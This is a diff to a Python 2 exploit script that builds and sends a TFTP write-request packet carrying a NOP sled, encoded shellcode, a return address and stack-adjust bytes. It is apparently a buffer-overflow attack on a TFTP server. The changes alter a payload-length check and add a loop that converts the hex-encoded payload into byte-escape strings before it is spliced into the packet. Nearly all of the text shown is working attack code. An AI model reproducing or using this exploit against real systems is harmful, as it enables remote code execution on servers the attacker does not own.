@@ -83,7 +83,7 @@ rv = os.system(cmd)
 payEncoded = open(payEncodedName, "rb")
 encodedPL = payEncoded.read()
 payEncoded.close()
-if len(encodedPL) > 210:
+if len(encodedPL)/2 > 210:
     print encodedPL
     print len(encodedPL)
 
@@ -95,8 +95,19 @@ except:
     print "failed to delete files for cleanup"
 
 #let's make the payload encoded
+epl = ""
+x = 0
+while x < len(encodedPL)-1:
+    if x > len(encodedPL) - 2:
+        x = x+2
+        break
+    else:
+        print x
+        print '\\x' + encodedPL[x] +encodedPL[x+1]
+        epl += '\\x' + encodedPL[x] +encodedPL[x+1]
+        x = x+2
 
-exploit = "\x00\x02" + nop + encodedPL + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
+exploit = "\x00\x02" + nop + epl + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
 
 ## create socket and send
 
